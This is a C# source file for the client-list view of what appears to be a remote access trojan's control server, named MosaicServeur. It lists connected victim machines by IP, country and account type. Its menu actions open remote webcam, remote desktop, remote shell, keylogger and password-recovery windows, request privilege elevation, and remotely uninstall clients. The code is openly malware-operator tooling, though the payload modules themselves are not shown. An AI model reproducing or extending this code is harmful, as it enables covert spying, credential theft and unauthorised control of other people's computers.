﻿using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Views;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace MosaicServeur.Main
{
    /// <summary>
    /// Logique d'interaction pour ClientsListView.xaml
    /// </summary>
    public partial class ClientsListView : UserControl
    {
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<ClientMosaique, bool>> _clientConnections = new Queue<KeyValuePair<ClientMosaique, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview
        private readonly object _clientsLock = new object();
        static int clientsCount;

        public ClientsListView()
        {           
            InitializeComponent();
            ClientMosaique.DvgUpdater += dgvUpdater;
            clientsCount = 0;
        }

        // MANAGE Event
        private void UninstallClientMenuItem(object sender, RoutedEventArgs e)
        {
            if (lvClients.Items.Count != 0)
            {
                if (getClient() != null)
                    new MosaiqueServeur.Packets.ServerPackets.UninstallClient().Execute(getClient());
            }
        }

        private void CloseClientMenuItem(object sender, RoutedEventArgs e)
        {
            if(lvClients.Items.Count != 0)
            {
                if(getClient() != null)
                    new Packets.ServerPackets.CloseClient().Execute(getClient());
            }
        }

        // System Event
        private void SysInfoMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmSystemInformation frmSi = new FrmSystemInformation(getClient());
                frmSi.Text = SetWindowTitle("Remote Desktop", getClient());
                frmSi.ShowDialog();
                frmSi.Focus();
            }
        }

        private void FileMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmFileManager frmFm = new FrmFileManager(getClient());
                frmFm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmFm.ShowDialog();
                frmFm.Focus();
            }
        }

        private void TaskMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmTaskManager frmTm = new FrmTaskManager(getClient());
                frmTm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmTm.ShowDialog();
                frmTm.Focus();
            }
        }

        private void StartupMgMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                FrmStartupManager frmSm = new FrmStartupManager(getClient());
                frmSm.Text = SetWindowTitle("Remote Desktop", getClient());
                frmSm.ShowDialog();
                frmSm.Focus();
            }
        }

        private void RunasMenuItem(object sender, RoutedEventArgs e)
        {
            new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
        }

        // Spying Event
        private void RdMenuItem(object sender, RoutedEventArgs e) // REMOTE DESKTOP
        {
            if (getClient() != null)
            {
                FrmRemoteDesktop frmRd = new FrmRemoteDesktop(getClient());
                frmRd.Text = SetWindowTitle("Remote Desktop", getClient());
                frmRd.ShowDialog();
                frmRd.Focus();
            }
        }

        private void RwMenuItem(object sender, RoutedEventArgs e) // REMOTE WEBCAM
        {
            if (getClient() != null)
            {
                FrmRemoteWebcam frmRw = new FrmRemoteWebcam(getClient());
                frmRw.Text = SetWindowTitle("Remote Webcam", getClient());
                frmRw.ShowDialog();
                frmRw.Focus();
            }
        }

        private void RsMenuItem(object sender, RoutedEventArgs e) // REMOTE SHELL
        {
            if (getClient() != null)
            {
                FrmRemoteShell frmRs = new FrmRemoteShell(getClient());
                frmRs.Text = SetWindowTitle("Remote Shell", getClient());
                frmRs.ShowDialog();
                frmRs.Focus();
            }
        }

        private void PrMenuItem(object sender, RoutedEventArgs e) // PASSWORD RECOVERY
        {
            if (getClient() != null)
            {
                FrmPasswordRecovery frmPr = new FrmPasswordRecovery(getClient());
                frmPr.Text = SetWindowTitle("Remote Shell", getClient());
                frmPr.ShowDialog();
                frmPr.Focus();
            }
        }

        private void KlMenuItem(object sender, RoutedEventArgs e) // KEY LOGGER
        {
            if (getClient() != null)
            {
                FrmKeyLogger frmKl = new FrmKeyLogger(getClient());
                frmKl.Text = SetWindowTitle("Remote Shell", getClient());
                frmKl.ShowDialog();
                frmKl.Focus();
            }
        }

        //Fun Functions
        private void openCDMenuItem(object sender, RoutedEventArgs e)
        {
            if (getClient() != null)
            {
                new MosaiqueServeur.Packets.ServerPackets.DoTrayCdOpenClose(true).Execute(getClient());
            }
        }

        private void closeCDMenuItem(object sender, RoutedEventArgs e)
        {
            new MosaiqueServeur.Packets.ServerPackets.DoTrayCdOpenClose(false).Execute(getClient());
        }

        /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
        public ClientMosaique getClient()
        {
            try
            {
                return ((ClientRegistration)lvClients.SelectedItem).Client;
            }
            catch
            {
                return null;
            }
        }

        #region UpdateClientsOfListView
        // :: GET - ADD - REMOVE FROM DATAGRIDVIEW :: //
        public void dgvUpdater(ClientMosaique client, bool addOrRem)
        {
            Dispatcher.BeginInvoke(new Action<ClientMosaique, bool>(DgvUpdater), client, addOrRem);
        }
        public void DgvUpdater(ClientMosaique client, bool addOrRem)
        {
            if (client != null)
            {
                if (!addOrRem)
                {
                    ClientDisconnected(client);
                }
                else
                {
                    ClientConnected(client);
                }
            }
        }

        private void ClientConnected(ClientMosaique client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaique, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(ClientMosaique client)
        {
            lock (_clientConnections)
            {
                if (!FrmListenerController.LISTENING) return;
                _clientConnections.Enqueue(new KeyValuePair<ClientMosaique, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        /// :: ADD OR REMOVE :: //
        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<ClientMosaique, bool> client;
                lock (_clientConnections)
                {
                    if (!FrmListenerController.LISTENING)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            addClientToListView(client.Key);
                            clientsCount++;
                            MosaicServeur.MainWindow.instance.setWindowTitle(clientsCount);
                            break;
                        case false:
                            removeClientFromListView(client.Key);
                            clientsCount--;
                            MosaicServeur.MainWindow.instance.setWindowTitle(clientsCount);
                            break;
                    }
                }
            }
        }

        private void addClientToListView(ClientMosaique client)
        {
            if (client == null) return;

            try
            {
                lvClients.Dispatcher.BeginInvoke(new Action(delegate
                {
                    lock (_lockClients)
                    {
                        lvClients.Items.Add(new ClientRegistration { Identifier = client.value.clientIdentifier, Ip = client.endPoint.ToString().Split(':')[0], Name = client.value.name, AccType = client.value.accountType,
                            Country = client.value.country, Os = client.value.operatingSystem, Status = "Connected", Client = client });
                    }
                }));
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void removeClientFromListView(ClientMosaique client)
        {
            if (client == null) return;

            try
            {
                lvClients.Dispatcher.BeginInvoke(new Action(delegate
                {
                    lock (_lockClients)
                    {
                       for(int i = 0; i < lvClients.Items.Count; i++)
                       {
                            if(client == ((ClientRegistration)lvClients.Items[i]).Client)
                            {
                                lvClients.Items.RemoveAt(i);
                            }
                       }
                    }
                }));
            }
            catch (InvalidOperationException)
            {
            }
        }
        #endregion

        //TOOLS 
        public string SetWindowTitle(string title, ClientMosaique c)
        {
            return string.Format("{0} - {1} - [{2}:{3}]", title, c.value.name, c.endPoint.Address.ToString(), c.endPoint.Port.ToString());
        }

        public static int connectedClients()
        {
            return clientsCount;
        }
    }    
}
